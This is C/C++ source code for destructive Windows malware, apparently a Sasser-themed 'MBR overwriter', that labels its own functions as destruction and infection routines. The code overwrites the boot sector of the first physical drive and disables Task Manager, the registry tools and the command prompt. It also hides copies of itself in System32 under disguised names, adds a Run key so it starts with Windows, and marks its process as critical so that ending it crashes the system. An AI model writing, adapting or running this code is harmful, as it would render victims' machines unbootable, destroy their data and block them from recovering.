#include <windows.h>
#include "System.h"
#include "Buffer.hpp"

// DESTRUCTION HEADER //

void OverwriteBootSector(void) {
	// MBR OVERWRITER //
	DWORD dwWriteBytes;
	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDrive == INVALID_HANDLE_VALUE) exit(0);
	WriteFile(hDrive, rawData, 32768, &dwWriteBytes, NULL);
	CloseHandle(hDrive);
}

const wchar_t* syspath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM";
void CorruptRegistry(void) {
	// SYSTEM TOOL DISABLER //
	ManageRegW(HKCU, syspath, L"DisableTaskmgr", REG_DWORD, 1, NULL, false, false);
	ManageRegW(HKCU, syspath, L"DisableRegistryTools", REG_DWORD, 1, NULL, false, false);
	ManageRegW(HKCU, L"SOFTWARE\\POLICIES\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, false, false);
}

LPCWSTR GetDir(void) {
	// GET THE CURRENT DIRECTORY //
	WCHAR dir[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR*)dir, MAX_PATH);
	return (LPCWSTR)dir;
}

void CopyMalwareFile(void) {
	// INFECTS THE SYSTEM //
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\System32\\Sasser.exe", FILE_ATTRIBUTE_HIDDEN, true);
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\System32\\oobe\\images\\genericexe.jpg.exe", FILE_ATTRIBUTE_HIDDEN, true);
	ManageRegW(HKLM, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Generic Executable", 0, NULL, (LPBYTE)L"C:\\WINDOWS\\System32\\Sasser.exe", false, true);
}

DWORD WINAPI SetStrings(LPVOID pvoid) {
	// DISPLAYS "Sasser is here!" EVERYWHERE //
	while (true) {
		HWND hwnd = GetDesktopWindow();
		EnumChildWindows(hwnd, &EnumChildProc, 0);
		Sleep(10);
	}
}

int IfWindowsXP(void) {
	OSVERSIONINFOW osvi;
	clearmem(&osvi, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
	GetVersionExW(&osvi);
	if (osvi.dwMajorVersion == 5) return true;
	return false;
}

typedef void(_stdcall* RTLPROCESSCRITICAL) (IN BYTE NewValue, OUT PBYTE OldValue, IN BYTE IsWinlogon);

WINBOOL EnablePrivs(LPCWSTR lpprivs) {
	HANDLE htk;
	LUID luid;
	TOKEN_PRIVILEGES token;
	RtlZeroMemory(&token, sizeof(token));
	
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY), &htk)) return false;
	if (!LookupPrivilegeValueW(NULL, lpprivs, &luid)) {
		CloseHandle(htk);
		return false;
	}
	
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	BOOL bret = AdjustTokenPrivileges(htk, false, &token, sizeof(token), NULL, NULL);
	CloseHandle(htk);
	return bret;
}

WINBOOL SetCritProcess(void) {
	HANDLE hlib;
	RTLPROCESSCRITICAL SetCritiProcess;
	
	hlib = LoadLibraryW(L"ntdll.dll");
	if (hlib != NULL) {
		EnablePrivs(L"SeDebugPrivilege");
		(SetCritiProcess) = (RTLPROCESSCRITICAL)GetProcAddress((HINSTANCE)hlib, "RtlSetProcessIsCritical");
		if (!SetCritiProcess) return 0;
		SetCritiProcess(1, 0, 0);
		return 1;
	}
	else return 0;
}
